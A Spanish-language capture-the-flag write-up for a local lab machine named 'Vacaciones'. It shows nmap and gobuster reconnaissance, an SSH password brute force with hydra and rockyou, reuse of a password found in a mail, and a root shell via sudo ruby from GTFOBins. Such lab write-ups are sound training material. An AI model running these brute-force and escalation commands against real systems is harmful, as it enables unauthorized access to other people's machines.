---
Maquina: Vacaciones
SO: Linux
Explotación: Fuerza bruta
Escala_privs: Permisos sudo / discovery
Dificultad: Muy fácil
tags:
  - maquina
  - fuerza_bruta
  - linux
  - ssh
  - discovery
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sV -Pn 172.17.0.2
```

![[Pasted image 20241022194158.png]]

2. **Investigación del portal web**:

Como hemos observado hay un portal web activo en el puerto 80, así que vamos a indagar en el a ver que encontramos.

Tras pasar la herramienta gobuster tenemos el siguiente resultado:

```bash 
gobuster dir -u http://172.17.0.2/ -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/big.txt -x .php,.py,.sj
```

![[Pasted image 20241022194430.png]]

Por lo que vemos nada fuera de lo normal (salvo lo de /javascript) y la página principal está completamente en blanco... Pero vamos a ver el código fuente de la web yyyyyy:

![[Pasted image 20241022195133.png]]

Pues juan y camilo... vamos a probar por SSH

## Explotación:

3. **Acceso al SSH por Fuerza Bruta**:

Con el usuario camilo, vamos a intentar hacer un ataque de hydra para poder acceder al SSH

```bash 
hydra -l camilo -P /home/alejandro/wordlists/rockyou.txt -t 5 -vvv ssh://172.17.0.2
```

![[Pasted image 20241022200102.png]]

4. Búsqueda del mail:

Listo, ya tenemos el usuario camilo con las pass -> password1. vamos a entrar a la máquina.

![[Pasted image 20241022200241.png]]

Como la shell es un poco fea la vamos a mejorar con

```bash
SHELL=/bin/bash script -q /dev/null
```

Listo y una vez mejorado el shell vamos a ver si podemos tener permisos en algún archivo/comando y tras ver que no es posible y buscar algún directorio importante.... vemos que hay un correo para camilo.

![[Pasted image 20241022201350.png]]

4. Escalada de privs:

Y si probamos a acceder al ssh con el nombre de juan y esa password, veremos que nos deja.

```bash
ssh 172.17.0.2 -l juan
```

![[Pasted image 20241022201456.png]]

Ahora podemos investigar a ver si tenemos permisos de sudo sobre algún comando

```bash
sudo -l
```

![[Pasted image 20241022201555.png]]

y con esto vemos que tenemos permisos de root sobre el comando de ruby, basta con buscar en gtfobins que podemos ejecutar yyyyy

```bash
sudo ruby -e 'exec "/bin/sh"'
```

![[Pasted image 20241022201716.png]]



